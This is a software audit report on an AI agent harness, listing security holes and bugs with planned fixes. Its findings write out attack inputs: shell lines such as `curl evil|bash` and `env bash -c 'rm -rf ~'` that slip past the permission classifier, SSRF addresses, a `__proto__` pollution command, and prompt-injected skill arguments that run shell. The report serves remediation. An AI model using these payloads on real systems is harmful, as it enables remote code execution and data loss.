# Full-codebase audit — 2026-06-10

**Scope:** every subsystem in the [subsystems atlas](../subsystems-overview.md) — all 17 regions, ~56k LoC TypeScript + the Go TUI + `bundle-default/` + release tooling. Holistic cross-cutting passes for data-leakage, resource-lifecycle, and cross-seam consistency.

**Method:** 21 area auditors (Opus) each read their full scope + the tests pinning it, traced real dataflow before reporting, and many ran live repro scripts. Adversarial verification was planned at 1–2 skeptic votes per finding; the automated verification round was cut short by a session limit, so the **critical + high findings were re-verified by hand** (direct code read + empirical scripts) before any fix. Two holistic passes (consistency, lifecycle) were re-dispatched after the limit reset.

**Baseline at audit time:** `lint` clean, `typecheck` clean, full suite **3625 pass / 0 fail / 16 skip** (fresh `HARNESS_HOME`). So any "this breaks a tested path today" claim is false by construction — every finding is on an **untested seam or a long-uptime / adversarial-input path**.

**Raw tally:** 107 area findings (3 critical, 27 high, 44 medium, 33 low) + the two holistic passes. After dedup (overlapping auditors filed the same bug from two ends) the unique set is smaller; see triage.

---

## Headline: an unauthenticated RCE on the channels gateway

The single most serious finding is a **remote-code-execution path reachable by any untrusted channel sender** (Slack / Telegram / webhook / SMS), built from two independently-confirmed defects in the Bash permission classifier:

- **`isReadOnlyBashCommand` misclassifies destructive commands as read-only**, because (a) `BASH_READ_COMMANDS` includes the *launchers* `env` and `find` — so `env bash -c 'rm -rf ~'`, `find . -delete`, and `find . -exec rm {} +` all classify read-only; and (b) the segment splitter `/\|\||&&|;|\|/` misses **newline** and **single `&`**, while per-segment it only checks the *first* token — so `cat README.md⏎rm -rf ~` and `cat x & rm -rf ~` classify read-only too.
- The channel permission posture (`src/channels/permission.ts`) is **safe-by-default only on the assumption that "Bash self-checks `ask`"** (its own comment, line 15). It uses empty rule layers + auto-deny `ask`. So when `Bash.checkPermissions` returns `allow` for a "read-only" command, `canUseTool.ts:47` returns `allow` with **no human in the loop** → the command runs on the gateway host.

Net: a message like `` find . -delete `` or `` cat x⏎curl evil|bash `` from an untrusted sender executes unprompted. The same misclassification also silently auto-allows destructive commands in the **default interactive TUI** (no prompt where the user expects one), and lets a smuggled command **ride a `Read` allow-rule** via the twin gap in `shellSemantics.splitShellSegments` (which feeds the Bash→virtual-Read rule path). This is **CRITICAL** and is fixed first, with a dedicated adversarial re-review of the permission core.

## Second headline: secrets reaching disk in five places, one already public

- **Public release tarballs (v0.2.0–v0.5.11) shipped the founder's private session trajectories**, including a real (now-dead) GitHub token, because the *local* release path `cpSync`'d the whole `bundle-default/` working tree — picking up gitignored `state/artifacts/trajectories/*.jsonl`. **Remediated during this audit:** all 25 dirty public releases were verified and purged; the leaked `gho_` token was confirmed already-revoked (HTTP 401) and is not the current `gh` token. The **staging fix + local quarantine + regression test** remain as code work.
- The **learning observer writes tool inputs/summaries to `observations.jsonl` unredacted** — directly relevant to the active learning soak, since the synthesizer then reads that file into an LLM request. Its sibling writers (trace, trajectory, router audit) all `redact()`; the observer was missed.
- **`redactSecrets` (config display) misses the channel secrets** (`botToken`, `signingSecret`, `webhook.secret`, `sms.accountSid`/`authToken`) — `/config show` and any config dump print them in clear.
- **Replay fixtures** and the **auth-header redaction regex** (escaped-quote mismatch on `JSON.stringify` output) round out a coherent **redaction cluster** fixed together.

## Multi-user isolation gaps (Phase E regressions)

Phase E shipped owner-scoping but three seams were missed — the same class as the C1/H1 leaks that Phase E's own review caught:

- **`/clear` mints an unowned child session** → on the multi-user gateway, principal A's cleared conversation 404s itself forever (owner mismatch). Filed from both ends (`sessionRecovery.ts` + `commandContext.ts`).
- **`/resume` and `/routing-stats --all` list *all* principals' sessions** (`listSessions`/`listRoutingAtomsAll` called without the owner filter the `GET /sessions` route uses) → cross-principal metadata leak.
- **`/review <verb> <id>`** passes an unvalidated id into a file path (traversal).

---

## Triage & dedup

Severity uses: **critical** = security-boundary breach / cross-user leak / data loss / mainline crash; **high** = real bug users will hit, significant leak, core-path correctness; **medium** = rare-path edge, meaningful perf, contract drift that will bite; **low** = minor / cosmetic / doc.

Notable **dedups** (one fix each):
- *Child tool allowlist ignores aliases* — filed by `agents-scheduler` and `extensions-hooks-mcp-bundle` (both `scheduler.ts:671`).
- */clear drops owner_id* — filed by `memory-persistence` (`sessionRecovery.ts`) and `server-routes` (`commandContext.ts`) — two ends of one flow.
- *Bash separator gap* — `C2` (BashTool) + the `permissions` shellSemantics finding are the same root in two files; fixed as one cluster.
- *Mission unreachable* — `scheduling` (`main.ts`), `cli` (`missionInit.ts`), and the `maxTurns` finding are one dead-feature cluster.
- *observations.jsonl* — appears as a leak (unredacted) and a perf (unbounded growth); two fixes, same file.

A handful of findings were **down-rated or accepted** on re-verification:
- *instinct `project_id` path traversal* (`instinctStore.ts`) — real but reachable only via synthesizer prompt-injection within the within-org trust model (conf 0.3); fixed anyway (cheap, defense-in-depth).
- *`@url` SSRF* — same root as WebFetch SSRF; folded into that fix.

---

## Resolution plan — dependency-ordered waves

Grouped by **disjoint file ownership** so waves parallelize without edit conflicts; the full pre-commit gate runs between waves; security-sensitive waves get an adversarial re-review.

| Wave | Theme | Files (owner) |
|---|---|---|
| **0** | Release-leak remediation | public purge (done) · `scripts/release-build-target.ts` + staging test · quarantine local `bundle-default/state/*.jsonl` |
| **1** | Permission/security core (hand-implemented + adversarial review) | `src/tools/BashTool.ts` · `src/permissions/shellSemantics.ts` · `src/tools/WebFetchTool.ts` + `src/context/references.ts` · `src/config/store.ts` (proto-pollution) · `src/skills/loader.ts` |
| **2** | Redaction / leakage | `src/learning/observer.ts` · `src/config/store.ts` (channel secrets — sequenced after W1) · `src/trajectory/redact.ts` · `src/eval/replay/loader.ts` |
| **3** | Multi-user isolation | `src/server/commandContext.ts` + `src/agent/sessionRecovery.ts` · `src/commands/reviewOps.ts` · `src/learning/instinctStore.ts`+`paths.ts` |
| **4** | Sub-agents / scheduler | `src/runtime/scheduler.ts` · `src/runtime/subprocessExecutor.ts` · `src/tasks/manager.ts` |
| **5** | Providers | `src/providers/anthropic.ts` · `src/providers/openai.ts` · `src/providers/credentials/{pool,rateGuard}.ts` · `src/router/{provider,classifier}.ts` |
| **6** | Core engine + persistence | `src/core/query.ts` · `src/agent/sessionDb.ts` · `src/context/injectionDefense.ts` |
| **7** | OpenAI API | `src/openai/routes/chatCompletions.ts` · `src/openai/mapping/requestToMessages.ts` |
| **8** | Channels / cron / mission / eval | `src/channels/adapters/telegram.ts` · `src/cron/*` + `src/cli/cronCommand.ts` · `src/mission/state.ts` + `src/cli/missionRun.ts`/`missionInit.ts` + `src/main.ts` · `src/eval/runner.ts` |
| **9** | Extensions: hooks / mcp / bundle / plugins | `src/hooks/*` · `src/mcp/{client,toolWrapper}.ts` · `src/bundle/loader.ts` · `src/plugins/secretScan.ts` · `bundle-default/business/system-prompt.md` |
| **10** | CLI / server misc | `src/cli/driveCommand.ts` · `src/tools/GrepTool.ts` · `src/server/routes/events.ts` · `src/server/webui.html` · `src/cli/init.ts` · `src/server/runtime.ts` (effort + capture) |
| **11** | TUI (Go — `go build`/`vet`/`test` gate) | `packages/tui/internal/app/app.go` · `components/compactline.go` · `render/markdown.go` · `components/liveregion.go` |

`src/server/runtime.ts` is touched by several concerns (hook wiring, capture-order, effort); all its edits are serialized into one owner (Wave 10) to avoid conflicts.

Each fix is TDD where a unit test is meaningful (RED → GREEN), with a targeted regression test named for the behavior. Doc-only / cosmetic lows are folded into the Wave-9/10 owners or the documentation pass.

---

## Full findings inventory

The complete per-finding inventory (all 107, with file:line, category, confidence, scenario, and suggested fix) follows. Status annotations: ✅ fixed · 📝 doc-fix · ⏸ deferred (with reason) are applied as the waves land.

### CRITICAL (3)

**C1. Public release tarballs ship founder's private trajectories incl. live GitHub token** — `scripts/release-build-target.ts:84` · leak · conf 0.95  
Local release cuts cpSync the whole bundle-default working tree, including gitignored state/artifacts/trajectories/*.jsonl (1.5MB of real session trajectories). Verified: public v0.2.1 and v0.5.1 tarballs on yevgetman/sov-releases contain them; failed.jsonl includes a captured .zshrc line with a real GH_TOKEN (gho_ilVJ...), BabyBoard project internals, 170 /Users/julie paths. v0.6.1+ CI builds clean.  
*Fix:* Rotate the gho_ token immediately; delete/rebuild v0.2.0–v0.5.1 release assets; exclude bundle-default/state/* (keep .gitkeep) in release staging; delete the local jsonl files.

**C2. Bash read-only allowlist + sudo guard bypassed by newline / single-& separators** — `src/tools/BashTool.ts:124` · security · conf 0.9  
In default AND ask modes a Bash command whose first segment is a read command but which appends a destructive command after a newline or single '&' is misclassified read-only and auto-allowed with NO permission prompt; bash then runs both. 'sudo' after a newline also evades detectPrivilegeEscalation. No configured rule needed.  
*Fix:* Add newline and single '&' (not '&&') to the segment-split regex in isReadOnlyBashCommand, detectPrivilegeEscalation, and matchesBashPermissionPattern; treat each as a hard separator.

**C3. Bash read-only allowlist auto-allows arbitrary exec via `env`/`find -exec`/`find -delete`** — `src/tools/BashTool.ts:115` · security · conf 0.88  
isReadOnlyBashCommand only inspects each segment's leading word, and BASH_READ_COMMANDS includes the launcher `env` and `find`. So `env bash -c '<anything>'`, `find . -exec rm {} +`, and `find . -delete` classify read-only → Bash.checkPermissions returns allow (no prompt) and isConcurrencySafe=true. In default interactive mode destructive/arbitrary commands run unprompted; worse, channel turns (buildChannelCanUseTool, mode default, empty rules) honor the tool self-allow — the documented safe posture assumes 'Bash self-checks ask'. An untrusted Slack/Telegram/webhook sender can run `env bash -c 'rm -rf ~'` on the gateway host.  
*Fix:* Remove `env` and `find` from BASH_READ_COMMANDS, or special-case: reject `env` with any non-assignment arg, and `find` containing -exec/-execdir/-delete/-ok/-fprint*. Treat command-launchers as non-read-only.


### HIGH (27)

**H1. Per-parent child cap bypassed and counter corrupted by parallel delegations** — `src/runtime/scheduler.ts:251` · bug · conf 0.75  
AgentTool and task_create are isConcurrencySafe, so the orchestrator Promise.all's up to 10 delegate() calls. Each call reads `current` before awaiting lane/write locks, then writes `current+1` after. All parallel calls see current=0: cap check never fires and the counter lost-updates. Reproduced: cap=2, 6 parallel delegates → 6 children created, 0 rejected, activeChildren()=1; first finisher deletes the entry while 5 run.  
*Fix:* Re-read and increment atomically before the first await (check+set synchronously at delegate entry, decrement by re-read in finally); reject over-cap before acquiring semaphores.

**H2. Child tool allowlist ignores tool aliases — bundle agents silently lose FileRead/FileWrite/FileEdit** — `src/runtime/scheduler.ts:671` · bug · conf 0.8  
buildChildToolPool matches allowedTools entries against tool.name only. FileRead/FileWrite/FileEdit declare aliases ['Read'/'Write'/'Edit'] (honored by permission rules), and every shipped strict-allowlist agent (explore, verify, plan, review-*, instinct-synthesizer, scheduled-mission) lists the alias spelling. Reproduced: agent with allowedTools ['Read','Grep'] + pool [FileReadTool,GrepTool] → child request carries only Grep. scheduled-mission loses all three file tools; the soak's synthesizer cannot FileRead its observations file.  
*Fix:* Match allowedTools entries against tool.name OR tool.aliases (same logic as config/rules.ts:56) in buildChildToolPool.

**H3. Telegram poll loop has no in-flight guard: duplicate turns/replies + 409 self-conflict** — `src/channels/adapters/telegram.ts:270` · bug · conf 0.8  
setInterval fires pollOnce every 1s with no overlap guard, but pollOnce awaits the full model turn before advancing offset (line 258). While a turn runs, every tick calls getUpdates with the stale offset; Telegram re-serves the unconfirmed update, so each second of turn duration queues another duplicate turn + duplicate reply (and duplicate billed provider calls). At idle, 1s ticks overlap the 25s long-poll, so Telegram 409-terminates the bot's own poll, logging spurious failures and arming backoff continuously.  
*Fix:* Add an inFlight flag (skip tick while a pollOnce is running), and/or advance+confirm the offset before awaiting handleUpdate so re-polls never re-serve a processed update.

**H4. drive ignores command sideEffects: /clear, /rollback, /compact never pivot the session** — `src/cli/driveCommand.ts:558` · bug · conf 0.75  
Drive reads only {output,error,promptToSend} from POST /commands. The server returns the new session id in sideEffects.newSessionId for /clear and /rollback (and /compact mints a child but the commands path publishes no SSE event). Drive prints "history cleared into child session X" yet keeps POSTing turns to the OLD session — history silently NOT cleared/rolled back/compacted; conversation forks. Known flakes #1/#2 mask this in the semantic suite.  
*Fix:* Parse sideEffects in runSlashCommand; on newSessionId update activeSessionId, reset sseCursor to null, reconnect (mirrors app.go's startSSE pivot).

**H5. /resume + /routing-stats --all leak other principals' sessions** — `src/server/commandContext.ts:267` · leak · conf 0.7  
On the multi-user gateway, principal A POSTs {name:'resume'} to /sessions/<A's own session>/commands (passes loadOwnedSession). runResumePicker calls ctx.listSessions(20), which here is unscoped, returning ALL principals' sessions. The emitted pickerOpen leaks B's session ids, titles, model, msg count, and cost to A. /routing-stats --all (line 370 listRoutingAtomsAll) leaks cross-principal routing stats the same way.  
*Fix:* Thread ownerIdOf(c) into buildServerCommandContext; pass it to listSessions(limit, owner) and use an owner-scoped routing-atoms query for --all.

**H6. Prototype pollution via /config set|unset dotpath traversal** — `src/config/store.ts:116` · security · conf 0.88  
setAt walks a user-controlled dotpath via cur[key]; a __proto__ segment resolves to Object.prototype, so `/config set __proto__.enabled true` pollutes Object.prototype (persists despite the later parse throw). unsetAt deletes prototype methods (`unset __proto__.hasOwnProperty` → subsequent .hasOwnProperty calls throw). Reachable locally, via `sov config set`, and remotely via POST /sessions/:id/commands on the shared gateway.  
*Fix:* In splitPath reject segments '__proto__'/'prototype'/'constructor' before any traversal; or build with Object.create(null)/Map and guard own-key assignment. Applies to both setAt and unsetAt.

**H7. Loop-detector first strike on a content-only turn orphans a trailing user message** — `src/core/query.ts:249` · bug · conf 0.6  
When the content-loop detector fires its first strike on an assistant turn with no tool_use blocks, query() pushes a standalone guidance user message, then immediately returns 'completed'/'max_tokens'. History ends on a user message; the next user turn appends another user message → consecutive users → Anthropic 400 'roles must alternate', breaking the session (same class as the orphaned-tool_use postmortem).  
*Fix:* Do not push/yield the standalone guidance on a content-only turn (it can never be acted on and breaks alternation); keep only the loop_detected event. Alternatively merge consecutive user messages during hydrate.

**H8. Scheduler child tool pool ignores aliases; bundle agents lose FileRead/FileEdit/FileWrite** — `src/runtime/scheduler.ts:671` · bug · conf 0.85  
buildChildToolPool matches allowedTools by exact tool.name only; bundle-default agents declare alias names (Read/Edit/Write). Proven via real registry: ['Read','Edit','Write','Grep'] yields pool [Grep]. explore/plan/verify lose FileRead (explore's prompt instructs Read with offset/limit); scheduled-mission loses Read+Edit+Write so it cannot write files; review-* and instinct-synthesizer lose Read — learning/review pipeline silently degraded.  
*Fix:* Match aliases in buildChildToolPool (mirror ruleMatchesTool), or rename bundle-default agent allowedTools to FileRead/FileEdit/FileWrite.

**H9. Hook first-use consent never prompts on any surface; auto-deny is silently persisted** — `src/hooks/consent.ts:109` · bug · conf 0.8  
usage.md:1991 promises a first-use TTY allow/deny prompt. The only consent checker ever built (runtime.ts:1142-1149) uses ask=()=>'deny' on every surface (TUI included), and buildConsentChecker persists that auto-deny to shell-hooks-allowlist.json as a user decision. Runner skips denied hooks with no log (runner.ts:70), despite runtime.ts:1146 claiming a stderr signal. Configured hooks are silently dead; first fire writes a deny entry users must hand-flip.  
*Fix:* Don't persist environment auto-denies (only user answers); log a one-line 'hook awaiting consent' on deny; wire a real TTY/approval-queue asker or fix docs.

**H10. Model-supplied SkillTool args inject inline shell, bypassing permission layer** — `src/skills/loader.ts:222` · security · conf 0.7  
SkillTool passes model-controlled `args` to expandSkillText. Args are appended ('User arguments:') even with no {{args}} placeholder, then the whole string is shell-interpolated for any non-plugin skill. Args like `` `!cmd` `` execute via Bun.spawn(bash) with NO permission prompt and bypass the load-time guard scan — RCE reachable via prompt injection against any installed bundle/user/community skill.  
*Fix:* Run interpolateShellCommands on the skill body BEFORE merging args, or strip/neutralize `` `!…` ``/`` !`…` `` tokens from args and the appended suffix so invoker/model args can never introduce shell.

**H11. Learning observer persists tool inputs to corpus unredacted** — `src/learning/observer.ts:83` · leak · conf 0.7  
When a tool input or its observation summary carries a secret (Bash command with an inline token, WebFetch URL with an API key, stderr summary echoing a credential), the observer appends it verbatim (<=256 chars) to observations.jsonl. The synthesizer sub-agent later Reads that file into its LLM request, sending the secret to its provider.  
*Fix:* Run redact() over tool_input_summary and observation_envelope.summary in buildObservation (or over the serialized line in observe), matching the trace/trajectory/audit writers.

**H12. Instinct write path does not validate project_id as a path segment** — `src/learning/instinctStore.ts:70` · security · conf 0.3  
InstinctStore.write builds the on-disk path from instinct.project_id (synthesizer-LLM-supplied, validated only as a string) while the sibling userId IS path-validated. A project_id like '../../<other-principal>' traverses out of the user's learning namespace; ensureLearningDirs + writeFileSync then land a .md outside it. Reachable only via synthesizer prompt-injection (within-org trust).  
*Fix:* Apply the same safe-segment validator to projectId inside projectRoot/instinctPath (reject separators, '.', '..'), as is already done for userId.

**H13. End-of-session synthesizer killed by immediate review abort** — `src/server/sessionContext.ts:517` · bug · conf 0.75  
On session disposal onSessionEnd() dispatches the fire-and-forget synthesizer, which shares reviewAbortController.signal. abort() then fires synchronously before the synthesizer's delegate (suspended at the lane-semaphore await) issues any model call. query() sees the aborted signal and returns 'interrupted', so sessions in the 10-49 activity band never synthesize at end — the loop's primary close mechanism for short sessions.  
*Fix:* Dispatch the end-of-session synthesizer under its own AbortController (timeout-bounded), not reviewAbortController.signal, so the review abort cannot kill the just-dispatched synthesis.

**H14. Session cleanup sweep exceeds SQLite bound-parameter limit -> boot crash loop** — `src/agent/sessionDb.ts:393` · edge · conf 0.6  
cleanupOldCronSessions (and the twin cleanupOldChannelSessions) selects stale session ids then deletes via IN(...). The session_compactions delete binds 2x ids. Bun's prepared-statement parameter count wraps at 65536, so at >=32768 stale sessions it throws 'expected 0 values, received 65536'. A per-minute cron job (documented ~43k rows/month) on a >53-day-uptime gateway accumulates that many rows older than the 30-day window; the next restart's boot sweep throws.  
*Fix:* Delete via correlated subquery (DELETE ... WHERE session_id IN (SELECT ... WHERE kind='cron' AND created_at<?)) like cleanupPhantomReviews, or chunk ids into <32k batches.

**H15. /clear drops owner_id -> gateway principal's cleared child session is inaccessible** — `src/agent/sessionRecovery.ts:30` · bug · conf 0.55  
createClearedChildSession reads the parent (which carries ownerId) but builds createInput without `owner`, so the child row is unowned. On the multi-user gateway, principal A's /clear (reachable via POST /sessions/:id/commands) mints an unowned child; the side-effect hops the client to it, and the next /turns call hits loadOwnedSession (owner A != null) -> 404, bricking the conversation. Same H1 class fixed for compaction/subagent children but missed here.  
*Fix:* Add `...(parent.ownerId !== null ? { owner: parent.ownerId } : {})` to createInput in createClearedChildSession.

**H16. Golden eval runner spawns dead `sov chat` surface — entire `sov eval run` broken since M13** — `src/eval/runner.ts:109` · bug · conf 0.9  
runGolden spawns `sov chat` with piped stdin. Since M13 (2026-05-20) chat boots the Go TUI, which exits 1 with no transcript on non-TTY stdin. Every golden, --compare, --capture and --replay run fails/aborts. The semantic suite was migrated to `sov drive`; this runner never was. usage.md still documents it as working.  
*Fix:* Spawn `drive` instead of `chat` (same line-per-prompt + /quit protocol); rework parseToolCalls/parseEstCost since drive emits no 'Tool Calls:'/'Est. Cost:' footer (only /info via renderSessionSummary does).

**H17. Tool-call history mapping produces Anthropic-invalid sequences (split/orphaned tool_results)** — `src/openai/mapping/requestToMessages.ts:80` · bug · conf 0.65  
Each OpenAI tool message maps to its OWN user message. Parallel tool_calls answered by separate tool messages yield assistant[tool_use A,B] → user[result A] → user[result B]; Anthropic requires ALL results in the immediately-next message → upstream 400, conversation permanently wedged. Same for clients replaying the harness's own streamed tool_calls without results (orphan tool_use → 400).  
*Fix:* After mapping, merge consecutive tool-derived user messages into one, then run repairMissingToolResults() (already in repo) to synthesize results for orphaned tool_use blocks.

**H18. shellSemantics splitShellSegments ignores newline and single-& separators** — `src/permissions/shellSemantics.ts:211` · security · conf 0.85  
splitShellSegments only breaks on ; && || | — not \n or single &. So analyzeShellCommand/isShellCommandReadOnly/bashVirtualToolName treat 'cat a\nrm b' as one read op and return virtual tool 'Read'. With any Read allow rule configured (common: allow-listing reads), the smuggled destructive command is auto-allowed via the virtual-tool rule path.  
*Fix:* In the splitShellSegments char loop, treat unescaped '\n', '\r', and a single '&' (when next char is not '&') as segment boundaries, same as ';'.

**H19. Anthropic thinking signature dropped; replay 400s on tool-use continuation with /effort on** — `src/providers/anthropic.ts:348` · bug · conf 0.72  
With effort != off on a Claude 4.x model, a turn emitting thinking + tool_use breaks: translateAnthropicStream accumulates signature_delta but finalizeBlock drops it (ContentBlock has no signature field), and blockToSdk replays thinking with signature:''. Anthropic verifies the final assistant turn's thinking signature on tool_result continuation, so the second model call of every tool-using turn 400s. redacted_thinking is dropped entirely (initWipFromStart returns null), same outcome.  
*Fix:* Carry signature on the internal thinking ContentBlock (and a redacted_thinking block), replay verbatim; or strip thinking blocks from outbound Anthropic messages except the signed final assistant turn.

**H20. Credential auth_failed status is permanent — rotated/fixed API key stays locked out** — `src/providers/credentials/pool.ts:150` · bug · conf 0.75  
One 401/403 marks a credential auth_failed in credentials.json. isUsable returns false forever (no cooldown, no reset path), the constructor preserves existing status, and the id is the env-var/config slot name — not the secret — so replacing a bad key with a valid one still yields CredentialUnavailableError ('no usable credential') at boot until the user hand-deletes credentials.json. Transient 403s (proxy, org hiccup) brick the provider too.  
*Fix:* Include hashSecret(secret) in the credential identity (or reset status when the secret hash changes), and/or add a cooldown TTL for auth_failed like exhausted.

**H21. sov mission run subcommand missing — wake path unreachable** — `src/main.ts:673` · consistency · conf 0.85  
The mission command group registers only `init`. `sov mission run --state-dir` (usage.md line 109, the launchd flow `mission init` prints) does not exist, and the documented interactive equivalent `sov --agent scheduled-mission --state-dir` is deferred-warned and ignored by tuiLauncher. runMissionWake is dead code; the whole scheduled-mission feature is unreachable. Lost in the Phase-16 revert (added in e90d54d).  
*Fix:* Re-register `mission run --state-dir <dir>` invoking runMissionWake (as commit e90d54d did), or delete missionRun.ts and fix usage.md + missionInit next-steps text.

**H22. /clear mints unowned child session — owner locked out (404) in multi-user mode** — `src/server/commandContext.ts:206` · bug · conf 0.68  
In principals mode, POST /sessions/:id/commands {name:'clear'} → clearHistory → createClearedChildSession mints a child with owner_id null (unlike compaction/scheduler children, it never stamps the parent owner). The response returns this child as newSessionId; every subsequent owner-gated request (loadOwnedSession) 404s it, so the user's conversation is dead until a new session is created. /rollback on it also 404s.  
*Fix:* Add `owner?` to CreateClearedChildSessionInput and pass `sessionCtx.userId` from clearHistory into createClearedChildSession (mirror compactor.ts:185 / runtime.ts:1236 H1 fix), so the cleared child inherits the principal.

**H23. WebFetch SSRF guard bypassed by IPv4-mapped IPv6 and DNS-to-private hosts** — `src/tools/WebFetchTool.ts:55` · security · conf 0.7  
isPrivateHost matches only literal dotted-IPv4 / a few IPv6 prefixes on the URL hostname string. `http://[::ffff:127.0.0.1]/` yields hostname `::ffff:7f00:1` (and `[::ffff:a9fe:a9fe]` → metadata 169.254.169.254) which none of the patterns match → allowed. Public DNS names resolving to private/loopback/metadata (e.g. *.nip.io, localtest.me) are never resolved, so they pass too. WebFetch is read-only, so it runs for untrusted channel senders → cloud-metadata exfil / loopback reach on a hosted gateway — exactly what the tool claims to block.  
*Fix:* Resolve hostname to IP(s) (dns.lookup all) and block if any resolved address is private/loopback/link-local; normalize ::ffff: mapped addresses to IPv4 before matching; block bare IPv6 embedding IPv4.

**H24. turn_error/ESC-cancel never finalizes streaming card; stale text bleeds into next turn** — `packages/tui/internal/app/app.go:1984` · bug · conf 0.85  
When a turn ends via turn_error (provider failure, or ESC-cancel whose error is swallowed via userCancelledTurn), the LiveRegion streaming buffer is never finalized. The partial assistant text stays rendered above the prompt indefinitely, and the NEXT turn's text_deltas append onto it — the merged blob is later committed as the new turn's card. ESC mid-stream is a common action.  
*Fix:* In the turn_error branch (including the userCancelledTurn early return), call EndAssistantCard and print the rendered partial before returning, mirroring turn_complete.

**H25. SSE reconnect busy-loops with no backoff and swallowed error when server is unreachable** — `packages/tui/internal/app/app.go:1462` · bug · conf 0.7  
If the sov server process dies (or /events persistently returns non-200, e.g. session deleted), Consume fails in microseconds on loopback, sseDoneMsg fires, and the handler immediately startSSE()s again — an unbounded tight loop spinning CPU and connection attempts. msg.err is never inspected, so the user sees a silently dead UI with no error.  
*Fix:* On sseDoneMsg with err, delay reconnect via tea.Tick with capped exponential backoff and print one dim 'connection lost, retrying' marker; give up or surface after N failures.

**H26. Detailed mode, verbose-raw, /expand, and DiffView render raw JSON bytes instead of decoded text** — `packages/tui/internal/app/app.go:1927` · bug · conf 0.8  
tool_result `output` arrives as a JSON-encoded string (newlines escaped as \n, surrounding quotes). Four consumers use string(tr.Output) verbatim: detailed ToolCard, verboseRaw print, the /expand ring, and NewDiffView. Users see one mega-line like "line1\nline2" with quotes; ParseDiff never finds real newlines so HasHunks is always false — mostRecentDiff never set, Ctrl+] diff focus is dead in production.  
*Fix:* Add a shared decodeOutputText(json.RawMessage) helper (string-unquote, fall back to raw) and use it at all four sites before rendering/splitting/diff-parsing.

**H27. Compact line never shows error glyph for failed tools** — `packages/tui/internal/components/compactline.go:168` · bug · conf 0.8  
Default compact mode renders failed tool calls (Bash nonzero exit, FileEdit no-match, hook-denied, validation failure) identically to successes — the promised ✗ glyph never appears. Since Phase 12.5 the wire output is plain text ("status: error\nsummary: ..."), not a JSON envelope, and ToolResultEvent carries no is_error; only "permission denied" prefix matches.  
*Fix:* After unwrapping the JSON string, also detect the plain-text "status: error" header prefix; better, add is_error to ToolResultEvent and consume it.


### MEDIUM (44)

**M1. TaskManager terminal-write failure throws out of its own catch → unhandled rejection + controller leak** — `src/tasks/manager.ts:176` · bug · conf 0.6  
tasks.parent_session_id is ON DELETE CASCADE; DELETE /sessions/:id (Phase D route) during a running background task removes the row. On completion, updateOnComplete throws (changes===0, or SQLITE_BUSY — store header notes no retry envelope); the catch block calls updateOnComplete again unguarded, which throws again, rejecting the void-ed runDelegation promise: unhandled rejection, controllers Map entry leaks, task_update never emitted, busy-case row stuck 'running' forever.  
*Fix:* Wrap both updateOnComplete calls in try/catch (log, still delete controller and safeEmit); treat missing-row as benign like updateState's handler does.

**M2. Subscription executor silently caps every run at 120s default, contradicting its own timeout contract** — `src/runtime/subprocessExecutor.ts:276` · consistency · conf 0.65  
runSubprocessExecutor always composes its own AbortSignal.timeout(config.timeoutMs ?? 120000) with the scheduler's signal, so min wins. The comment claims 'the scheduler's per-child timeout wins; this is the fallback when neither is set' — false: with timeoutMs unset, the scheduler's 480s default (maxTurns 8×60s) is overridden and any claude -p run >2min is killed. Parent-cancel is also misreported as 'timed out after Xms' and returns terminal 'error' (TaskManager 'failed') where the native path yields 'interrupted'/'cancelled'.  
*Fix:* Only create the internal timeout when config.timeoutMs is set (scheduler already enforces one); distinguish opts.signal.aborted from timeout in the message and terminal reason.

**M3. 4MB stdout cap turns a successful long claude -p run into an error terminal** — `src/runtime/subprocessExecutor.ts:467` · edge · conf 0.5  
--verbose stream-json embeds full tool_result payloads (file reads, command output). A delegated run that reads a few large files exceeds MAX_STDOUT_BYTES=4MB; readCapped truncates, the terminal 'result' frame is cut, and parseStreamJson returns 'subscription-executor produced no terminal result event' — the whole delegation reports error and skips learning replay despite the subprocess succeeding (exit 0).  
*Fix:* Parse lines incrementally and always retain the final 'result' frame (e.g. keep a tail buffer), or treat exit 0 + truncated stream as completed-with-truncation.

**M4. sov drive busy-loops ~45 reconnects/sec whenever no turn is active** — `src/cli/driveCommand.ts:202` · perf · conf 0.85  
Phase B Fix 2 (events route) ends a non-follow stream immediately when nothing replays and no turn is active. Drive's reconnect loop only pauses 20ms, so at boot and between every turn it spins ~45 HTTP connections/sec (measured), each doing an SQLite getSession + bus subscribe/unsubscribe — for hours in idle automation sessions. The Go TUI shares this reconnect pattern with NO pause; worth a sibling check.  
*Fix:* Use `?follow=true` (built for persistent streams; reconnect only on session pivot), or add exponential backoff when a connection ends having delivered zero events.

**M5. cron list/run print 8-char id prefixes that no cron subcommand accepts** — `src/cli/cronCommand.ts:59` · bug · conf 0.85  
formatJobLine truncates UUID job ids to 8 chars — the only id `sov cron list` shows — but getJob/deleteJob/mutateJob match the FULL id only. So list → show/pause/resume/delete always fails "no job ...". Worse, `sov cron run` success output explicitly tells the user to run `sov cron show <id.slice(0,8)>`, a command guaranteed to fail. Full id is only recoverable from `cron add` output or jobs.json.  
*Fix:* Add unique-prefix resolution in cronCommand helpers (error on ambiguous), or print full ids in formatJobLine and the cron-run hint.

**M6. Mission wake is unreachable from any CLI, but `sov mission init` instructs users to run it** — `src/cli/missionInit.ts:82` · consistency · conf 0.75  
runMissionWake (src/cli/missionRun.ts) has no production caller: there is no `sov mission run` subcommand, and `sov chat --agent/--state-dir` — the exact command missionInit's "Next steps" prints — is warn-and-ignored by tuiLauncher with a stale "targeting milestone M7" message (M7 closed 2026-05-15). Users following the scaffold get a plain TUI chat with no mission semantics; launchd jobs referenced in missionRun's header can't run a wake either.  
*Fix:* Add `sov mission run --state-dir <dir>` wiring runMissionWake, and update missionInit's next-steps text + the stale M7 warnings.

**M7. drive's SSE cursor is re-poisoned after a mid-turn compaction pivot** — `src/cli/driveCommand.ts:659` · bug · conf 0.55  
On compaction_complete drive resets sseCursor to null, but the same old-bus connection then delivers more events (deltas, turn_complete) and drainSseStream re-sets the cursor to those high old-bus seqs. The next reconnect to the NEW session sends that stale high Last-Event-ID, so events buffered during a reconnect gap are replay-filtered away — dropped early events on the first post-compaction turn; a fast (mock/replay) turn can lose turn_complete entirely, hanging drive on awaitTurnTerminal.  
*Fix:* Mirror app.go: track cursorSession alongside cursor; in drainSseStream reset cursor to null when sessionIdRef.current changed since the cursor was recorded.

**M8. /review <verb> <id> path traversal (unvalidated proposal id)** — `src/commands/reviewOps.ts:302` · security · conf 0.6  
